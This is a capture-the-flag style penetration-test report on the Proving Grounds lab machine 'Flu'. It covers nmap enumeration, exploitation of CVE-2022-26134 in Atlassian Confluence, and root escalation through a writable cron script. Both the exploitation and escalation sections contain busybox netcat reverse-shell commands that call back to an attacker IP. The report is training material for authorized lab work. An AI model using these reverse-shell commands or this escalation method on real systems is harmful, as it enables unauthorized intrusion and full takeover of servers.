
# Report-Flu

## Engagement Overview

Laboratory: Offensive Security Proving Grounds

Target Name: Flu

Target IP Address: 192.168.172.41

Operating System: Linux

## Information Gathering:

Full Nmap scan of all ports:

```bash
nmap -sC -sV -p- $ip
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-21 10:31 +0100
Nmap scan report for 192.168.172.41
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
8091/tcp open  jamlink?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Wed, 21 Jan 2026 09:32:44 GMT
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Wed, 21 Jan 2026 09:32:13 GMT
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Wed, 21 Jan 2026 09:32:14 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Wed, 21 Jan 2026 09:32:14 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Wed, 21 Jan 2026 09:32:49 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8091-TCP:V=7.98%I=7%D=1/21%Time=69709D1D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Wed,\x2021\x20Jan\x202026\x2009:32:13\x20GMT\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAcc
SF:ess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\
SF:r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\
SF:nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Wed,\x2021\x20Jan\x202026\x2009:3
SF:2:14\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%r
SF:(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-M
SF:ethods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.6
SF:\r\nDate:\x20Wed,\x2021\x20Jan\x202026\x2009:32:14\x20GMT\r\nConnection
SF::\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1\
SF:x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(po
SF:ssibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Request
SF:-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\
SF:.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20To
SF:o\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(T
SF:LSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\n
SF:text\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\x
SF:20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Wed,\x2021\x20J
SF:an\x202026\x2009:32:44\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDSt
SF:ring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20
SF:is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\.
SF:1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(
SF:possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Wed,\x2021\x20Jan\x202026\x2009:
SF:32:49\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r
SF:\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.47 seconds
```

Enumeration of port 8090 using a browser:
Accessing the service through a browser revealed a login page: http://192.168.172.41:8090/login.action?os_destination=%2Findex.action&permissionViolation=true

<img width="1209" height="680" alt="Pasted image 20260121103641" src="https://github.com/user-attachments/assets/4dd2b76c-1a35-4295-a8d2-98c5f01430bd" />

The page was identified as Atlassian Confluence, version 7.13.6, as indicated by the footer:
```
Powered by Atlassian Confluence 7.13.6
```

Default credentials such as admin:admin and admin:password were tested but were not valid.

Port 8091 was also checked but did not return any response.

Directory enumeration was performed using Gobuster against the Confluence web service.  
No additional interesting endpoints or hidden directories were identified during this phase.

The following exploit was initially tested but did not work in this environment: https://www.exploit-db.com/exploits/51904

<img width="1204" height="356" alt="Pasted image 20260121105155" src="https://github.com/user-attachments/assets/646651e1-4274-4b5a-aed1-f746b70d0d35" />

<img width="660" height="299" alt="Pasted image 20260121105141" src="https://github.com/user-attachments/assets/a4c2e532-7aa2-4e61-8b98-96706d9866f3" />

Further research led to another exploit targeting CVE-2022-26134, a known unauthenticated Remote Code Execution vulnerability in Atlassian Confluence: https://www.exploit-db.com/exploits/50952

<img width="1204" height="356" alt="Pasted image 20260121105230" src="https://github.com/user-attachments/assets/08b4d7b9-c250-46d0-863c-3208f7eca91a" />

## Initial Access

### Vulnerability Exploited: Confluence Data Center 7.18.0 - Remote Code Execution (CVE-2022-26134)

Vulnerability Explanation: In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. 

### Exploitation:

Command:

```
python3 50952.py -u $url:8090 -c "busybox nc 192.168.45.234 80 -e /bin/bash"
```

<img width="500" height="137" alt="Pasted image 20260121105406" src="https://github.com/user-attachments/assets/1c1206cf-117c-42c9-bfd0-09bf6287cbc4" />

<img width="685" height="263" alt="Pasted image 20260121105557" src="https://github.com/user-attachments/assets/c1477a7e-2d73-4e82-9bf3-5a35a566cb83" />

<img width="516" height="120" alt="Pasted image 20260121105722" src="https://github.com/user-attachments/assets/f4f75b37-2906-4ae4-996c-aa8695fa12a7" />

The target was confirmed to be vulnerable to CVE-2022-26134.
This resulted in a successful reverse shell connection to the attacker machine, granting command execution on the target system as the confluence user.

## Privileged Escalation

### Vulnerability Exploited: Misconfigured Cron Job

Vulnerability Explanation: A scheduled cron job executed by the root user was found to run the script /opt/log-backup.sh.  
Although the script was executed with root privileges, it was owned and writable by the unprivileged confluence user. 

### Enumeration:

After obtaining a shell as the `confluence` user, local enumeration was performed to identify potential privilege escalation vectors.

The tool pspy was used to monitor running processes without requiring root privileges.  
Using `pspy`, a recurring cron job executed by the root user was observed:

- The script `/opt/log-backup.sh` was periodically executed by `/bin/bash`
    
- The process was running by root

This confirmed the presence of a root-owned cron job executing a script located in /opt.

<img width="1087" height="186" alt="Pasted image 20260121120804" src="https://github.com/user-attachments/assets/0a9e63a9-2180-472d-b5b5-580bd531d807" />

The file permissions of the script were checked:

```bash
ls -l /opt/log-backup.sh
```

<img width="756" height="130" alt="Pasted image 20260121121327" src="https://github.com/user-attachments/assets/b58bcfec-6aa9-4c0a-a09b-8a73b38ba16a" />

The output showed that the script was owned by the `confluence user and was writable:

`-rwxr-xr-x 1 confluence confluence log-backup.sh`

The script contained backup-related commands that accessed the directory /root/backup, confirming that it was executed with root privileges.
Because the script was executed by root (via cron), but modifiable by the confluence user,

It was possible to abuse this misconfiguration to achieve privilege escalation.

<img width="661" height="347" alt="Pasted image 20260121112325" src="https://github.com/user-attachments/assets/8f4a7a94-31c5-4109-b71e-d83db1a253a5" />

### Exploitation:

The script `/opt/log-backup.sh` was overwritten with a reverse shell payload:

```bash
echo 'bash -c "busybox nc 192.168.45.234 4444 -e /bin/bash"' > log-backup.sh
```
After waiting for the cron job to execute, a reverse shell connection was received on the attacker machine.

<img width="519" height="126" alt="Pasted image 20260121121538" src="https://github.com/user-attachments/assets/d09f646b-9af7-4305-a946-bdaf1c89c087" />

The obtained shell was running as the root user, successfully completing the privilege escalation.




